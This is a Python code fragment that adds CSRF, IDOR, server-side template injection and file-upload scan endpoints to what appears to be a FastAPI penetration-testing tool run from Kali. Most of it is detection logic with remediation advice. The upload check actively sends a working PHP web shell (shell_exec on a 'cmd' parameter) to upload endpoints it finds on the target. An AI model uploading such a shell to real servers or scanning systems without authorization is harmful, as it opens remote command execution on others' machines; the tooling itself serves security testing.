# ══════════════════════════════════════════════════════════════
#  PASTE AT BOTTOM OF main.py ON KALI VM
#  Phases 26-29: CSRF, IDOR, SSTI, File Upload
# ══════════════════════════════════════════════════════════════

import requests as _req_lib
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ── CSRF TESTING ───────────────────────────────────────────────
@app.post("/api/scan/csrf")
async def csrf_scan(req: ScanRequest, user=Depends(verify_token)):
    findings = []
    forms_checked = 0
    try:
        r = _req_lib.get(req.target, timeout=10, verify=False,
                         headers={"User-Agent": "Mozilla/5.0"}, allow_redirects=True)
        html = r.text
        forms = re.findall(r"<form[^>]*?>.*?</form>", html, re.DOTALL | re.IGNORECASE)
        forms_checked = len(forms)
        csrf_patterns = ["csrf", "_token", "token", "authenticity_token",
                         "__requestverificationtoken", "xsrf", "nonce"]
        for i, form in enumerate(forms):
            has_csrf = any(p in form.lower() for p in csrf_patterns)
            m = re.search(r'method=["\'](\w+)["\']', form, re.IGNORECASE)
            method = m.group(1).upper() if m else "GET"
            am = re.search(r'action=["\']([^"\']*)["\']', form, re.IGNORECASE)
            action = am.group(1) if am else req.target
            if method in ("POST", "PUT", "DELETE") and not has_csrf:
                findings.append({
                    "detail": f"CSRF: Form #{i+1} (action={action}) — POST form has no CSRF token",
                    "severity": "HIGH", "cvss": "8.0", "cve": "N/A",
                    "cwe": "CWE-352", "cwe_name": "Cross-Site Request Forgery",
                    "owasp": "A01:2021 - Broken Access Control",
                    "remediation": "Add CSRF tokens to all state-changing forms. Use SameSite=Strict on session cookies."
                })
        # Check Referer-Policy header
        if not r.headers.get("Referrer-Policy"):
            findings.append({
                "detail": "Missing Referrer-Policy header — server cannot verify request origin",
                "severity": "LOW", "cvss": "3.1", "cve": "N/A",
                "cwe": "CWE-352", "cwe_name": "Cross-Site Request Forgery",
                "owasp": "A01:2021 - Broken Access Control",
                "remediation": "Add Referrer-Policy: strict-origin-when-cross-origin header."
            })
        # Check SameSite on cookies
        set_cookie = r.headers.get("Set-Cookie", "")
        if set_cookie and "samesite" not in set_cookie.lower():
            findings.append({
                "detail": "Session cookie missing SameSite attribute — CSRF risk via cross-site requests",
                "severity": "MEDIUM", "cvss": "5.4", "cve": "N/A",
                "cwe": "CWE-352", "cwe_name": "Cross-Site Request Forgery",
                "owasp": "A01:2021 - Broken Access Control",
                "remediation": "Set SameSite=Strict or SameSite=Lax on all session cookies."
            })
    except Exception as e:
        findings.append({"detail": f"CSRF scan error: {e}", "severity": "INFO",
                         "cvss": "0.0", "cve": "N/A", "cwe": "N/A", "cwe_name": "Scan Error",
                         "owasp": "N/A", "remediation": "Check target accessibility."})

    vulnerable = any(f["severity"] in ("HIGH", "CRITICAL") for f in findings)
    scan_id = str(uuid.uuid4())
    raw = {"output": f"CSRF: {forms_checked} forms checked, {len(findings)} issue(s) found.", "cmd": "python-csrf-checker"}
    save_scan(scan_id, "csrf", req.target, raw)
    return {"scan_id": scan_id, "target": req.target, "tool": "csrf", "vulnerable": vulnerable,
            "findings": findings, "total": len(findings), "forms_checked": forms_checked,
            "raw_output": raw["output"], "command": raw["cmd"],
            "timestamp": datetime.datetime.utcnow().isoformat()}


# ── IDOR / ACCESS CONTROL TESTING ──────────────────────────────
@app.post("/api/scan/idor")
async def idor_scan(req: ScanRequest, user=Depends(verify_token)):
    findings = []
    tested = []
    base = req.target.rstrip("/")
    hdrs = {"User-Agent": "Mozilla/5.0"}
    idor_pairs = [
        ("/user/1", "/user/2"), ("/users/1", "/users/2"),
        ("/api/user/1", "/api/user/2"), ("/profile/1", "/profile/2"),
        ("/account/1", "/account/2"), ("/order/1", "/order/2"),
        ("/api/orders/1", "/api/orders/2"), ("/document/1", "/document/2"),
        ("/file/1", "/file/2"), ("/invoice/1", "/invoice/2"),
    ]
    for p1, p2 in idor_pairs:
        try:
            r1 = _req_lib.get(base + p1, timeout=5, verify=False, headers=hdrs, allow_redirects=False)
            r2 = _req_lib.get(base + p2, timeout=5, verify=False, headers=hdrs, allow_redirects=False)
            tested.append({"path": p1, "status": r1.status_code})
            if r1.status_code == 200 and r2.status_code == 200 and len(r1.text) > 50:
                if len(r1.text) != len(r2.text):
                    findings.append({
                        "detail": f"Potential IDOR: {p1} and {p2} both return 200 with different content ({len(r1.text)} vs {len(r2.text)} bytes)",
                        "severity": "HIGH", "cvss": "8.1", "cve": "N/A",
                        "cwe": "CWE-639", "cwe_name": "Authorization Bypass Through User-Controlled Key",
                        "owasp": "A01:2021 - Broken Access Control",
                        "remediation": "Verify server-side that the authenticated user owns the requested resource before returning data."
                    })
            elif r1.status_code == 200 and r2.status_code in (401, 403):
                findings.append({
                    "detail": f"Access control inconsistency: {p1} returns 200 but {p2} returns {r2.status_code}",
                    "severity": "MEDIUM", "cvss": "6.5", "cve": "N/A",
                    "cwe": "CWE-639", "cwe_name": "Authorization Bypass Through User-Controlled Key",
                    "owasp": "A01:2021 - Broken Access Control",
                    "remediation": "Apply consistent authorization enforcement across all resource endpoints."
                })
        except Exception:
            pass
    # Check for sequential numeric IDs in page source
    try:
        r = _req_lib.get(req.target, timeout=5, verify=False, headers=hdrs)
        if re.search(r'/(user|order|account|profile|id)/[0-9]{1,6}["\'/]', r.text, re.IGNORECASE):
            findings.append({
                "detail": "Sequential numeric IDs found in page source — IDOR risk via ID enumeration",
                "severity": "MEDIUM", "cvss": "6.5", "cve": "N/A",
                "cwe": "CWE-639", "cwe_name": "Authorization Bypass Through User-Controlled Key",
                "owasp": "A01:2021 - Broken Access Control",
                "remediation": "Replace sequential IDs with UUIDs. Enforce authorization on every object-level request."
            })
    except Exception:
        pass

    vulnerable = any(f["severity"] in ("HIGH", "CRITICAL") for f in findings)
    scan_id = str(uuid.uuid4())
    raw = {"output": f"IDOR: {len(tested)} paths tested, {len(findings)} issue(s) found.", "cmd": "python-idor-checker"}
    save_scan(scan_id, "idor", req.target, raw)
    return {"scan_id": scan_id, "target": req.target, "tool": "idor", "vulnerable": vulnerable,
            "findings": findings, "total": len(findings), "tested": tested,
            "raw_output": raw["output"], "command": raw["cmd"],
            "timestamp": datetime.datetime.utcnow().isoformat()}


# ── SSTI TESTING ────────────────────────────────────────────────
@app.post("/api/scan/ssti")
async def ssti_scan(req: ScanRequest, user=Depends(verify_token)):
    findings = []
    tested = 0
    hdrs = {"User-Agent": "Mozilla/5.0"}
    payloads = [
        ("{{7*7}}", "49"),           # Jinja2, Twig
        ("${7*7}", "49"),            # FreeMarker, Groovy
        ("<%= 7*7 %>", "49"),        # ERB (Ruby)
        ("#{7*7}", "49"),            # Ruby
        ("*{7*7}", "49"),            # Thymeleaf
        ("{{7*'7'}}", "7777777"),    # Twig specific
        ("${{7*7}}", "49"),          # Pebble
    ]
    params = ["q", "search", "query", "name", "id", "template", "view", "msg", "text", "page"]
    for payload, expected in payloads:
        for param in params[:6]:
            try:
                r = _req_lib.get(req.target, params={param: payload}, timeout=5, verify=False, headers=hdrs)
                tested += 1
                if expected in r.text:
                    findings.append({
                        "detail": f"SSTI CONFIRMED: param '{param}' payload '{payload}' → server returned '{expected}'",
                        "severity": "CRITICAL", "cvss": "9.8", "cve": "N/A",
                        "cwe": "CWE-94", "cwe_name": "Code Injection via Template Engine",
                        "owasp": "A03:2021 - Injection",
                        "remediation": "Never pass user input directly to template engines. Use sandboxed rendering. Validate all input."
                    })
                r2 = _req_lib.post(req.target, data={param: payload}, timeout=5, verify=False,
                                   headers={**hdrs, "Content-Type": "application/x-www-form-urlencoded"})
                tested += 1
                if expected in r2.text:
                    findings.append({
                        "detail": f"SSTI CONFIRMED (POST): param '{param}' payload '{payload}' → server returned '{expected}'",
                        "severity": "CRITICAL", "cvss": "9.8", "cve": "N/A",
                        "cwe": "CWE-94", "cwe_name": "Code Injection via Template Engine",
                        "owasp": "A03:2021 - Injection",
                        "remediation": "Never pass user input directly to template engines. Use sandboxed rendering."
                    })
            except Exception:
                pass
    # Error-based engine detection
    try:
        r = _req_lib.get(req.target, params={"q": "{{invalid syntax]]}"}, timeout=5, verify=False, headers=hdrs)
        engine_sigs = {"Jinja2": ["jinja2", "TemplateSyntaxError"],
                       "Twig": ["Twig_Error", "TwigSyntaxError"],
                       "FreeMarker": ["FreeMarker", "freemarker"],
                       "Smarty": ["SmartyException"],
                       "Velocity": ["VelocityException"]}
        for engine, sigs in engine_sigs.items():
            if any(s.lower() in r.text.lower() for s in sigs):
                findings.append({
                    "detail": f"Template engine '{engine}' disclosed via error response — confirms SSTI attack surface",
                    "severity": "HIGH", "cvss": "7.5", "cve": "N/A",
                    "cwe": "CWE-94", "cwe_name": "Code Injection via Template Engine",
                    "owasp": "A03:2021 - Injection",
                    "remediation": "Disable verbose error output in production. Sanitize input before template rendering."
                })
    except Exception:
        pass

    vulnerable = any(f["severity"] in ("HIGH", "CRITICAL") for f in findings)
    scan_id = str(uuid.uuid4())
    raw = {"output": f"SSTI: {tested} combinations tested, {len(findings)} issue(s) found.", "cmd": "python-ssti-checker"}
    save_scan(scan_id, "ssti", req.target, raw)
    return {"scan_id": scan_id, "target": req.target, "tool": "ssti", "vulnerable": vulnerable,
            "findings": findings, "total": len(findings),
            "raw_output": raw["output"], "command": raw["cmd"],
            "timestamp": datetime.datetime.utcnow().isoformat()}


# ── FILE UPLOAD TESTING ─────────────────────────────────────────
@app.post("/api/scan/fileupload")
async def fileupload_scan(req: ScanRequest, user=Depends(verify_token)):
    findings = []
    tested_endpoints = []
    hdrs = {"User-Agent": "Mozilla/5.0"}
    base = req.target.rstrip("/")
    upload_paths = [
        "/upload", "/uploads", "/upload.php", "/file-upload", "/fileupload",
        "/upload/image", "/api/upload", "/files/upload", "/media/upload",
        "/images/upload", "/documents/upload", "/attachments",
        "/DVWA/vulnerabilities/upload/", "/profile/upload", "/avatar",
    ]
    dangerous_files = [
        ("shell.php",     b"<?php echo shell_exec($_GET['cmd']); ?>", "application/octet-stream"),
        ("shell.php5",    b"<?php echo 'UPLOAD_TEST_49'; ?>",         "application/octet-stream"),
        ("shell.phtml",   b"<?php echo 'UPLOAD_TEST_49'; ?>",         "text/html"),
        ("shell.php.jpg", b"<?php echo 'UPLOAD_TEST_49'; ?>",         "image/jpeg"),
    ]
    for path in upload_paths:
        try:
            r = _req_lib.get(base + path, timeout=5, verify=False, headers=hdrs, allow_redirects=True)
            if r.status_code not in (200, 301, 302, 403):
                continue
            tested_endpoints.append({"path": path, "status": r.status_code})
            if r.status_code == 200 and ('type="file"' in r.text.lower() or "multipart" in r.text.lower()):
                findings.append({
                    "detail": f"File upload form detected at {path} — manual test for unrestricted upload required",
                    "severity": "HIGH", "cvss": "8.8", "cve": "N/A",
                    "cwe": "CWE-434", "cwe_name": "Unrestricted Upload of Dangerous File Type",
                    "owasp": "A05:2021 - Security Misconfiguration",
                    "remediation": "Validate file type server-side using allowlist. Store uploads outside webroot. Rename files on upload."
                })
                # Try uploading dangerous file
                for fname, content, mime in dangerous_files[:2]:
                    try:
                        ru = _req_lib.post(base + path,
                                           files={"file": (fname, content, mime),
                                                  "upload": (fname, content, mime)},
                                           timeout=5, verify=False, headers=hdrs)
                        if ru.status_code in (200, 201) and any(
                                x in ru.text.lower() for x in ["success", "uploaded", fname.split(".")[0]]):
                            findings.append({
                                "detail": f"CRITICAL: Server accepted '{fname}' at {path} — potential webshell / RCE risk",
                                "severity": "CRITICAL", "cvss": "9.8", "cve": "N/A",
                                "cwe": "CWE-434", "cwe_name": "Unrestricted Upload of Dangerous File Type",
                                "owasp": "A05:2021 - Security Misconfiguration",
                                "remediation": "Block PHP/JSP/ASP uploads immediately. Use server-side MIME inspection, not just extension check."
                            })
                    except Exception:
                        pass
        except Exception:
            pass
    # Check main page for hidden upload forms
    try:
        r = _req_lib.get(req.target, timeout=5, verify=False, headers=hdrs)
        actions = re.findall(
            r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>.*?type=["\']file["\']',
            r.text, re.DOTALL | re.IGNORECASE)
        for action in actions:
            findings.append({
                "detail": f"File upload form on main page (action='{action}') — verify server-side extension validation",
                "severity": "MEDIUM", "cvss": "6.5", "cve": "N/A",
                "cwe": "CWE-434", "cwe_name": "Unrestricted Upload of Dangerous File Type",
                "owasp": "A05:2021 - Security Misconfiguration",
                "remediation": "Implement strict server-side file type validation with content-type inspection."
            })
    except Exception:
        pass

    vulnerable = any(f["severity"] in ("HIGH", "CRITICAL") for f in findings)
    scan_id = str(uuid.uuid4())
    raw = {"output": f"File upload: {len(tested_endpoints)} endpoints tested, {len(findings)} issue(s) found.", "cmd": "python-fileupload-checker"}
    save_scan(scan_id, "fileupload", req.target, raw)
    return {"scan_id": scan_id, "target": req.target, "tool": "fileupload", "vulnerable": vulnerable,
            "findings": findings, "total": len(findings), "tested_endpoints": tested_endpoints,
            "raw_output": raw["output"], "command": raw["cmd"],
            "timestamp": datetime.datetime.utcnow().isoformat()}
